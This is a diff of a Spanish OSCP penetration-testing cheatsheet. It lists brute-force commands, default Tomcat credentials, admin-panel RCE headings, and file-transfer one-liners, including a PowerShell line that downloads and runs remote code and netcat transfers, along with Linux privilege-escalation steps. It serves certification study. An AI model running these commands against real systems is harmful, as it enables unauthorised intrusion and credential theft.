@@ -14,8 +14,8 @@ img_path: /images
 
 Bienvenidos a mi Cheatsheet personal para la certificación de la OSCP
 
-## Protocolos
 
+## Protocolos
 ### FTP -> 21
 FTP (File Transfer Protocol) es un protocolo comunmente utilizado para la transferencia de archivos utiliza el puerto 21 para comando y control y el 20 para el transporte de datos
 
@@ -149,6 +149,8 @@ Wordpress es un gestor de contenido web (CMS) comunmente empleado.
 
 ##### WPSCAN
 
+Herramienta para hacer un scan general de wordpress como encontrar plugins con vulnerabilidades o enumerar usuarios validos en wordpress
+
 ```shell
 # Scan
 wpscan --url <URL>
@@ -165,7 +167,9 @@ wpscan --url <URL> -U "<USER>" -P <PASSWORDS.txt>
 ```
 (Podemos emplear wpseku como alternativa)
 
-##### Wordpress panel RCE
+##### Wordpress a RCE (admin requerido)
+
+Obtener `Ejecución remota de comandos` (RCE) estando previamente autenticado como admin en wordpress
 
 ```shell
 Modificamos el php del tema usado (Credenciales de admin Requeridas)
@@ -185,7 +189,7 @@ http://<IP>/wp-content/themes/twentytwelve/404.php
 droopescan scan -u <URL>
 ```
 
-##### Username enumeration
+##### Enumeración de usuarios
 
 ```shell
 In /user/register just try to create a username and if the name is already taken it will be notified :
@@ -202,7 +206,7 @@ Accessing /user/<number> you can see the number of existing users :
 	- /user/2 -> Page not found (user doesn't exist)
 ```
 
-##### Hidden pages enumeration
+##### Enumeración de paginas ocultas
 
 ```shell
 Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
@@ -211,7 +215,7 @@ You could find hidden pages (test, dev) which are not referenced by the search e
 wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
 ```
 
-##### Drupal panel RCE
+##### Drupal a RCE
 
 ```shell
 You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
@@ -232,7 +236,7 @@ joomscan -u <URL>
 
 #### Tomcat
 
-##### Default credentials
+##### Credenciales por defecto
 
 ```shell
 The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are:
@@ -245,13 +249,13 @@ tomcat:s3cr3t
 admin:tomcat
 ```
 
-##### Brute force 
+##### Fuerza bruta 
 
 ```shell
 hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
 ```
 
-##### Tomcat panel RCE
+##### Tomcat a RCE
 
 ```shell
 # Generate payload
@@ -446,14 +450,14 @@ LOAD_FILE('alsdjfl');
 
 ### POP3 -> 110
 
-#### Brute force 
+#### Fuerza bruta
 
 ```
 hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
 hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
 ```
 
-#### Read mail
+#### Leer un correo
 
 ```
 telnet <IP> 110
@@ -467,9 +471,17 @@ QUIT
 
 ---
 
-### SNMP -> 161
+### NTP -> 123/udp
 
-#### Brute force community string
+`NTP (Network Time Protocol)` es un protocolo de Internet para sincronizar los relojes de los sistemas informáticos
+
+Existen distintas herramientas para conectarte con ntp y sincronizar tu hora
+
+---
+
+### SNMP -> 161/udp
+
+#### Fuerza bruta de la community string
 
 ```
 onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
@@ -501,7 +513,7 @@ ldapsearch -h <IP> -x -s base
 ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
 ```
 
-#### Graphical Interface
+#### Interfaz Grafica
 
 ```
 jxplorer
@@ -789,7 +801,7 @@ cd <SHARE>
 
 ### MYSQL -> 3306
 
-#### Brute force
+#### Fuerza bruta
 
 ```
 hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
@@ -802,7 +814,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-#### Connect
+#### Conectarte
 
 ```
 # Local
@@ -813,7 +825,7 @@ mysql -u <USER> -p
 mysql -h <IP> -u <USER>
 ```
 
-#### MySQL commands
+#### MySQL comandos
 
 ```
 show databases;
@@ -844,7 +856,7 @@ Cheatsheet :
 
 ### RDP -> 3389
 
-#### Brute force
+#### Fuerza bruta
 
 ```
 crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
@@ -853,7 +865,7 @@ crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
 hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
 ```
 
-#### Connect with known credentials / hash
+#### Conectarte con contraseña o hashes
 
 ```
 rdesktop -u <USERNAME> <IP>
@@ -887,19 +899,19 @@ net localgroup "Remote Desktop Users" <USER> /add
 
 ### VNC  -> 5800, 58001, 5900, 59001
 
-#### Scans
+#### Escaneo
 
 ``` 
 nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
 ```
 
-#### Brute force
+#### Fuerza bruta
 
 ```
 hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
 ```
 
-#### Connect
+#### Conectarte
 
 ```
 vncviewer <IP>:<PORT>
@@ -944,13 +956,13 @@ Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
 
 ### WINRM -> 5985, 5986
 
-#### Brute force
+#### Fuerza bruta
 
 ```
 crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 ```
 
-#### Connecting
+#### Conectarte
 
 ```
 evil-winrm -i <IP> -u <USER> -p <PASSWORD>
@@ -959,7 +971,156 @@ evil-winrm -i <IP> -u <USER> -H <HASH>
 
 ---
 
-## Scripts Basicos en BASH
+## Tansferencia de archivos
+
+### Linux
+
+Estas son distintas formas de transferir archivos entre maquinas linux
+
+```shell
+# INICIANDO UN SERVIDOR WEB CON PYTHON
+sudo python -m SimpleHTTPServer <PORT> # Opción 1
+sudo python -m http.server <PORT> # Opción 2
+
+# FTP
+sudo python3 -m pyftpdlib  -p 21 -w
+
+# INICIANDO UN SERVIDOR SMB
+sudo impacket-smbserver smbFolder $(pwd) -smb2support
+
+# WGET
+wget <URL> -o <OUT_FILE>
+
+# CURL
+curl <URL> -o <OUT_FILE>
+
+# NETCAT
+nc -lvp 443 > <OUT_FILE> # Victima
+nc <IP> 443 < <IN_FILE>  # Atacante
+
+# SCP
+scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
+scp -P 2222 -i id_rsa pspy www-data@10.10.10.246:/tmp/pspy # Ejemplo
+```
+
+---
+
+### Windows
+
+```powershell
+# FTP 
+echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
+ftp -v -n -s:ftp.txt
+
+# SMB
+copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
+copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
+
+# Powershell
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
+powershell "wget <URL>"
+
+# Python
+python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
+
+# CertUtil
+certutil.exe -urlcache -split -f "<URL>"
+
+# NETCAT
+nc -lvp 1234 > <OUT_FILE> 
+nc <IP> 1234 < <IN_FILE>
+
+# CURL
+curl <URL> -o <OUT_FILE>
+```
+
+---
+
+### Escalada de Privilegios
+
+### Linux
+
+#### Enumeración con Scripts
+
+```shell
+# Hay un repositorio en github con la utilidad linpeas la cual nos reportará
+# información y posibles vectores de ataque
+./linpeas.sh
+
+# Contamos con pspy que es un repositorio de una utilidad en python que nos permite
+# ver que comandos suceden en el sistema con privilegios, ideal para intentar un
+# path hijacking
+pspy.py
+```
+
+#### Enumerar permisos
+
+```shell
+# Tratamos de listar aquellos archivos suid
+find / -perm -4000 2>/dev/null 
+
+# Listamos capabilites de las que poder abusar en el sistema
+getcap -r / 2>/dev/null
+
+```
+
+#### Methodology to follow
+
+```shell
+# En caso de que haya un gestor de contenidos
+# o una web con sql y php buscar credenciales en
+# config.php o el que corresponda ubicado en la raiz
+# de la web
+
+# Ver si podemos leer claves privadas ssh de algún usuario
+# o podemos añadir nuestra clave publica al authorized_keys
+
+# Ver si podemos ejecutar algo con sudo
+sudo -l
+
+# Ver si hay algun archivo raro en el home de algun usuario
+# tambien comprobar el .bash_history (los archivos ocultos
+# empiezan por . y para verlos usamos ls -la)
+
+# Reutilizar credenciales encontradas en los usuarios y servicios
+
+# Enumerar permisos SUID GUID Y CAPABILITIES
+
+# Ver si podemos modificar el /etc/password
+
+# Buscar en /etc archivos que contengan cadenas relevantes
+# como el nombre de nuestro usuario
+grep -Ri "wh1texnd" /etc 2>/dev/null
+
+# Listar puertos abiertos para encontrar los que no están expuesto
+# para hacer port forwarding
+netstat -nat
+
+
+# Si estamos en un docker
+Kernel Exploits
+OS Exploits
+Password reuse (mysql, .bash_history, 000- default.conf...)
+Known binaries with suid flag and interactive (nmap)
+Custom binaries with suid flag either using other binaries or with command execution
+Writable files owned by root that get executed (cronjobs)
+MySQL as root
+Vulnerable services (chkrootkit, logrotate)
+Writable /etc/passwd
+Readable .bash_history
+SSH private key
+Listening ports on localhost
+/etc/fstab
+/etc/exports
+/var/mail
+Process as other user (root) executing something you have permissions to modify
+SSH public key + Predictable PRNG
+apt update hooking (PreInvoke)
+```
+
+
+## Scripts en BASH
 
 ### Enumeración de Red
 
@@ -1020,6 +1181,8 @@ tput civis; for host in ${hosts[@]};do
 done;tput cnorm
 ```
 
+---
+
 ### Monitorización de Procesos
 
 Podemos emplear el siguiente script en bash:
@@ -1037,3 +1200,27 @@ done
 
 > Podemos tambien hacer uso de la utilidad pspy:
 > [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+
+---
+
+## Scripts en Python
+
+### TOTP empleando NTP
+
+`TOTP` es un algoritmo que permite generar una contraseña de un solo uso que utiliza la hora actual como fuente de singularidad, cambiando así cada varios minutos. [NTP](#NTP)
+
+```python
+#!/usr/bin/python3
+import pyotp
+import ntplib
+
+client=ntplib.NTPClient()
+response=client.request("10.10.10.246")
+
+totp = pyotp.TOTP("orxxi4c7orxwwzlo")
+
+print("EL TOKEN es -> %s" % totp.at(response.tx_time))
+
+```
+
+---
